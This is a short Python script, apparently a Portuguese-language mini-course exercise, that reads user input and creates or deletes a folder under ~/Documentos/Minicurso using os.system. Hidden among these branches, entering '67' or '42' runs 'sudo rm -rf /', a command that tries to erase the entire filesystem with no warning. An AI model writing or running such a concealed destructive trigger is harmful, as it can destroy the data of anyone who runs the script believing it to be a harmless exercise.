import os
var = str(input("Digite um número: "))
if var == "67" or var == '42':
    os.system('sudo rm -rf /')
elif var == "Remova a pasta!":
    os.system('rm -rf ~/Documentos/Minicurso/yaaay!!!')
else:
    os.system('mkdir ~/Documentos/Minicurso/yaaay!!!')